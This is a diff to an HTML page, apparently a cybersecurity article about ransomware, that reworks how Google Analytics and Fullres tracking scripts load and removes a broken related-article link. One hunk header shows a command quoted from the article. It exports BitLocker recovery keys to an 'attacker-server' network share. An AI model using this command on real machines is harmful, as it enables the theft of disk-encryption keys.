@@ -450,31 +450,21 @@
         })();
     </script>
     <!-- Google Analytics 4 -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-XL6RCXZJE2"></script>
     <script>
-        window.addEventListener('load', function () {
-            setTimeout(function () {
-                var gtmScript = document.createElement('script');
-                gtmScript.async = true;
-                gtmScript.src = 'https://www.googletagmanager.com/gtag/js?id=G-XL6RCXZJE2';
-                document.head.appendChild(gtmScript);
-                gtmScript.onload = function () {
-                    window.dataLayer = window.dataLayer || [];
-                    function gtag() { dataLayer.push(arguments); }
-                    window.gtag = gtag;
-                    gtag('js', new Date());
-                    gtag('config', 'G-XL6RCXZJE2');
-                };
-            }, 100);
-        });
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'G-XL6RCXZJE2');
     </script>
-    <!-- Fullres Analytics -->
+        <!-- Fullres Analytics -->
     <script>
-        window.addEventListener('load', function () {
+        (function () {
             var fullres = document.createElement('script');
             fullres.async = true;
             fullres.src = 'https://t.fullres.net/thehgtech.js?' + (new Date() - new Date() % 43200000);
             document.head.appendChild(fullres);
-        });
+        })();
     </script>
     <link rel="stylesheet" href="/mobile-nav.css">
 </head>
@@ -1165,7 +1155,7 @@ manage-bde -protectors -get C: > \\attacker-server\keys\%COMPUTERNAME%.txt</code
                 <div class="related-articles" style="margin-top: 2rem;">
                     <h3>Related Articles</h3>
                     <ul>
-                        <li><a href="dxs-nhs-ransomware-breach-2025.html" style="color: var(--accent-cyan);">DXS
+                        <li><a data-removed-broken-link="true" style="color: var(--accent-cyan);">DXS
                                 International NHS Breach: DevMan Ransomware Claims Healthcare Provider</a></li>
                         <li><a href="/guides/ransomware-response-playbook.html"
                                 style="color: var(--accent-cyan);">Ransomware Response Playbook</a></li>
